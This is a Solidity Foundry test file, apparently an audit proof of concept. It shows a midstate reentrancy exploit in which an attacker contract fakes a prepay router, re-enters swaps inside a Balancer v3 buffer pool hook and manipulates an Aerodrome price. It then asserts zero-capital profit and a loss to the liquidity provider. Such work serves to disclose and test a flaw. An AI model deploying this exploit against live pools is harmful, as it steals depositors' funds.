// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Math} from "@crane/contracts/utils/Math.sol";
import {IVault} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IVault.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {
    VaultSwapParams,
    SwapKind
} from "@crane/contracts/external/balancer/v3/interfaces/contracts/vault/VaultTypes.sol";
import {IStandardExchangeBufferPool} from
    "contracts/protocols/dexes/balancer/v3/pools/constProd/standardExchange/IStandardExchangeBufferPool.sol";
import {TestBase_StandardExchangeBufferPool} from
    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";

interface IAeroRouterLite {
    struct Route { address from; address to; bool stable; address factory; }
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, Route[] calldata routes, address to, uint256 deadline)
        external returns (uint256[] memory amounts);
    function getReserves(address tokenA, address tokenB, bool stable, address _factory) external view returns (uint256, uint256);
}

/// @notice Unprivileged attacker "router". It calls Vault.swap directly, so the Balancer Vault reports
///         it as params.router to the buffer hook. It answers prepaySessionActive() with 32 bytes, so
///         the hook hands it control via passPrepayAuth() in the middle of _preSeatShares (after the
///         drain/removeLiquidity, before hookSharesDelta is adjusted).
contract MidstateAttacker {
    IVault public immutable vault;
    address public immutable pool;
    IERC20 public immutable tta;
    IERC20 public immutable shares;
    IAeroRouterLite public aero;
    IERC20 public usdc;
    address public aeroFactory;

    uint256[] public sells; // sells[0] = outer, sells[k] = nested depth k
    uint256 public depth;
    bool public nest;
    bool public armed;
    bool public fixAero;

    uint256 public ttaReceived;
    uint256 public ttaPaid;
    uint256 public borrowed; // TTA taken from the BV3 vault (sendTo) mid-unlock, repaid before unlock ends
    uint256 public repaid;
    int256 public sharesDeltaEnd;
    int256 public ttaDeltaEnd;

    constructor(IVault v, address p, IERC20 t, IERC20 s) {
        vault = v; pool = p; tta = t; shares = s;
    }

    function setAero(IAeroRouterLite a, IERC20 u, address f) external {
        aero = a; usdc = u; aeroFactory = f;
        tta.approve(address(a), type(uint256).max);
        u.approve(address(a), type(uint256).max);
    }

    // ---- fake IndexedEx prepay-router surface ----
    function prepaySessionActive() external pure returns (bool) { return true; }
    function restorePrepayAuth() external pure returns (bool) { return true; }

    function passPrepayAuth(address) external returns (bool) {
        require(msg.sender == pool, "only pool hook");
        if (!armed) return true;
        if (depth < sells.length) {
            (uint256 rD0, uint256 rU0) = aero.getReserves(address(tta), address(usdc), false, aeroFactory);
            uint256 s = sells[depth];
            depth++;
            _sell(s); // re-enter Vault.swap on the same pool against the half-updated book
            // The enclosing level previewed its SE exchangeOut at (rD0,rU0); our nested SE zap moved
            // Aerodrome. Push the price back (slight overshoot) so the enclosing exchangeOut succeeds.
            if (fixAero) _restoreAero(rD0, rU0);
        }
        return true;
    }

    function _restoreAero(uint256 rD0, uint256 rU0) internal {
        (uint256 rD, uint256 rU) = aero.getReserves(address(tta), address(usdc), false, aeroFactory);
        // target DAI reserve for price rD0/rU0 at current k
        uint256 target = Math.sqrt(Math.mulDiv(rD * rU, rD0, rU0));
        if (target <= rD) return;
        uint256 a = ((target - rD) * 106) / 100 + 1e15;
        vault.sendTo(tta, address(this), a);
        borrowed += a;
        IAeroRouterLite.Route[] memory r = new IAeroRouterLite.Route[](1);
        r[0] = IAeroRouterLite.Route(address(tta), address(usdc), false, aeroFactory);
        aero.swapExactTokensForTokens(a, 0, r, address(this), block.timestamp);
    }

    function run(uint256[] calldata sells_, bool nest_, bool fixAero_) external returns (int256 net) {
        delete sells;
        for (uint256 i; i < sells_.length; ++i) sells.push(sells_[i]);
        nest = nest_; fixAero = fixAero_;
        ttaReceived = 0; ttaPaid = 0; borrowed = 0; repaid = 0;
        uint256 before = tta.balanceOf(address(this));
        vault.unlock(abi.encodeCall(this.cb, ()));
        net = int256(tta.balanceOf(address(this))) - int256(before);
    }

    function cb() external returns (bytes memory) {
        require(msg.sender == address(vault), "only vault");
        uint256 total;
        for (uint256 i; i < sells.length; ++i) total += sells[i];
        if (nest) {
            depth = 1; armed = true;
            _sell(sells[0]);
            armed = false;
            require(depth == sells.length, "not all nested sells fired");
        } else {
            for (uint256 i; i < sells.length; ++i) _sell(sells[i]);
        }
        // unwind the Aerodrome price fix: USDC -> DAI
        uint256 u = address(usdc) == address(0) ? 0 : usdc.balanceOf(address(this));
        if (u > 0) {
            IAeroRouterLite.Route[] memory r = new IAeroRouterLite.Route[](1);
            r[0] = IAeroRouterLite.Route(address(usdc), address(tta), false, aeroFactory);
            uint256[] memory am = aero.swapExactTokensForTokens(u, 0, r, address(this), block.timestamp);
            repaid = am[am.length - 1];
        }
        // Buy back exactly the shares sold: Vault share delta nets to zero (no share capital needed).
        // (chunked to respect WeightedMath MAX_OUT_RATIO; chunking does not change constant-product cost)
        uint256 remaining = total;
        uint256 chunk = total / 5 + 1;
        while (remaining > 0) {
            uint256 c_ = remaining < chunk ? remaining : chunk;
            (, uint256 ttaIn,) = vault.swap(VaultSwapParams({
                kind: SwapKind.EXACT_OUT, pool: pool, tokenIn: tta, tokenOut: shares,
                amountGivenRaw: c_, limitRaw: type(uint256).max, userData: ""
            }));
            ttaPaid += ttaIn;
            remaining -= c_;
        }
        // repay the borrowed DAI we hold (from the USDC->DAI unwind)
        if (repaid > 0) {
            tta.transfer(address(vault), repaid);
            vault.settle(tta, repaid);
        }
        sharesDeltaEnd = vault.getTokenDelta(shares);
        ttaDeltaEnd = vault.getTokenDelta(tta);
        require(sharesDeltaEnd == 0, "share delta not zero");
        if (ttaDeltaEnd < 0) {
            vault.sendTo(tta, address(this), uint256(-ttaDeltaEnd)); // profit credit
        } else if (ttaDeltaEnd > 0) {
            tta.transfer(address(vault), uint256(ttaDeltaEnd)); // loss paid from own capital
            vault.settle(tta, uint256(ttaDeltaEnd));
        }
        return "";
    }

    function _sell(uint256 s) internal {
        (, , uint256 out) = vault.swap(VaultSwapParams({
            kind: SwapKind.EXACT_IN, pool: pool, tokenIn: shares, tokenOut: tta,
            amountGivenRaw: s, limitRaw: 0, userData: ""
        }));
        ttaReceived += out;
    }
}

contract HookMidstateReentrancyTest is TestBase_StandardExchangeBufferPool {
    MidstateAttacker internal atk;
    IStandardExchangeBufferPool internal P;
    uint256 internal fixedRate;
    uint256 internal rate0;
    uint256 internal vAfter0;

    function setUp() public override {
        super.setUp();
        P = IStandardExchangeBufferPool(bufferPool);
        atk = new MidstateAttacker(bv3Vault, bufferPool, tta, shares);
        atk.setAero(IAeroRouterLite(address(aeroRouter)), IERC20(address(usdc)), address(aeroPoolFactory));
        vm.label(address(atk), "Attacker");
    }

    function _derivedYRaw() internal view returns (uint256) {
        (, , uint256[] memory bal,) = bv3Vault.getPoolTokenInfo(bufferPool);
        int256 h = P.hookSharesDelta();
        uint256 b = bal[P.sharesIndex()];
        return h >= 0 ? b - uint256(h) : b + uint256(-h);
    }

    function _sells(uint256[] memory bps) internal view returns (uint256[] memory s) {
        uint256 y = _derivedYRaw();
        s = new uint256[](bps.length);
        for (uint256 i; i < bps.length; ++i) s[i] = (y * bps[i]) / 10_000;
    }

    /// @dev Value of alice's whole BPT position, exited proportionally, priced at the SE share rate.
    function _aliceExitValue() internal returns (uint256 v, uint256 ttaOut, uint256 shOut) {
        uint256 snap = vm.snapshotState();
        uint256 bpt = IERC20(bufferPool).balanceOf(alice);
        vm.startPrank(alice);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
        vm.stopPrank();
        uint256[] memory out = removeLiquidityProportional(alice, bpt, 0, 0);
        ttaOut = out[P.ttaIndex()];
        shOut = out[P.sharesIndex()];
        uint256 rate = fixedRate == 0 ? seRateProvider.getRate() : fixedRate;
        v = ttaOut + (shOut * rate) / 1e18;
        vm.revertToState(snap);
    }

    function _logState(string memory tag) internal view {
        console2.log(tag);
        console2.log("  virtualTTA      ", P.virtualTTA());
        console2.log("  hookSharesDelta ", P.hookSharesDelta());
        console2.log("  derivedY(raw)   ", _derivedYRaw());
        console2.log("  share rate      ", seRateProvider.getRate());
    }

    function _run(uint256[] memory bps, bool nest) internal returns (int256 net, uint256 vBefore, uint256 vAfter) {
        uint256[] memory s = _sells(bps);
        _logState("before");
        rate0 = seRateProvider.getRate();
        uint256 t0; uint256 s0;
        (vBefore, t0, s0) = _aliceExitValue();
        console2.log("  alice exit before: TTA, shares    ", t0, s0);
        // control path may need a TTA buffer to pay a shortfall; account it as attacker capital (net is delta).
        if (!nest) mintTTA(address(atk), 1_000e18); // control path pays its loss from own capital
        net = atk.run(s, nest, true);
        _logState("after");
        (vAfter,,) = _aliceExitValue();
        {
            uint256 rateBefore = rate0;
            fixedRate = rateBefore;
            (uint256 vAfterAtRate0, uint256 t1, uint256 s1) = _aliceExitValue();
            fixedRate = 0;
            console2.log("  alice exit after: TTA, shares     ", t1, s1);
            console2.log("  alice LP exit value after @pre-attack share rate", vAfterAtRate0);
            vAfter0 = vAfterAtRate0;
        }
        console2.log("  attacker TTA received from sells ", atk.ttaReceived());
        console2.log("  attacker TTA paid for buyback    ", atk.ttaPaid());
        console2.log("  aero-fix DAI borrowed / returned ", atk.borrowed(), atk.repaid());
        console2.log("  attacker net TTA (signed) ");
        console2.logInt(net);
        console2.log("  attacker shares balance          ", shares.balanceOf(address(atk)));
        console2.log("  alice LP exit value before (DAI) ", vBefore);
        console2.log("  alice LP exit value after  (DAI) ", vAfter);
    }

    function _bps4() internal pure returns (uint256[] memory b) {
        b = new uint256[](4);
        b[0] = 2500; b[1] = 2000; b[2] = 1500; b[3] = 1000;
    }

    function _bps2() internal pure returns (uint256[] memory b) {
        b = new uint256[](2);
        b[0] = 2500; b[1] = 2000;
    }

    function test_exploit_nestedPreSeat_4levels() public {
        (uint256 rD0, uint256 rU0) = IAeroRouterLite(address(aeroRouter)).getReserves(address(tta), address(usdc), false, address(aeroPoolFactory));
        uint256 seTotal0 = IERC20(address(seVault)).totalSupply();
        (int256 net, uint256 vb, uint256 va) = _run(_bps4(), true);
        (uint256 rD1, uint256 rU1) = IAeroRouterLite(address(aeroRouter)).getReserves(address(tta), address(usdc), false, address(aeroPoolFactory));
        console2.log("  [review] aero reserves DAI/USDC before", rD0, rU0);
        console2.log("  [review] aero reserves DAI/USDC after ", rD1, rU1);
        console2.log("  [review] SE share supply before/after ", seTotal0, IERC20(address(seVault)).totalSupply());
        console2.log("  [review] attacker USDC / DAI end      ", usdc.balanceOf(address(atk)), tta.balanceOf(address(atk)));
        assertEq(usdc.balanceOf(address(atk)), 0, "attacker holds no USDC (no hidden side asset)");
        assertEq(tta.balanceOf(address(atk)), uint256(net), "net == full DAI balance (started at 0)");
        assertEq(shares.balanceOf(address(atk)), 0, "attacker holds no shares");
        assertGt(net, 0, "attacker net TTA profit, zero capital");
        assertLt(va, vb, "LP lost value");
        assertLt(vAfter0, vb, "LP lost value even at the pre-attack share rate");
        console2.log("  attacker profit (DAI)", uint256(net));
        console2.log("  LP loss @pre-attack rate (DAI)", vb - vAfter0);
    }

    /// @dev Informational: with only one nested level the edge (~0.4% of x) is smaller than the
    ///      Aerodrome price-fix round-trip cost, so it is net negative. Buffer capital so the loss can be paid.
    function test_info_nestedPreSeat_2levels() public {
        mintTTA(address(atk), 1_000e18);
        (int256 net,,) = _run(_bps2(), true);
        console2.log("2-level net");
        console2.logInt(net);
    }

    function test_control_sequential_4() public {
        (int256 net,,) = _run(_bps4(), false);
        assertLt(net, 0, "sequential round trip must lose (fees)");
    }
}
